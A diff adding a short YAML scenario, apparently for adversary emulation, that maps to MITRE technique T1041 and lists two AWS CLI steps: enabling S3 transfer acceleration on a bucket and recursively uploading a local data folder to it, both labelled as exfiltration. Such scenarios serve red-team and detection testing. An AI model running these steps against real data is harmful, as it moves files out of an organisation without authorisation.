@@ -1,0 +1,9 @@
+name: Exfiltration via S3 Transfer Acceleration
+description: Exfiltration via S3 Transfer Acceleration
+mitre_technique: T1041
+stage: Exfiltration
+steps:
+- action: aws s3api put-bucket-accelerate-configuration --bucket mybucket --accelerate-configuration Status=Enabled
+  description: Enable transfer acceleration for faster exfiltration
+- action: aws s3 cp ./data s3://mybucket/ --recursive
+  description: Upload data to S3 for exfiltration
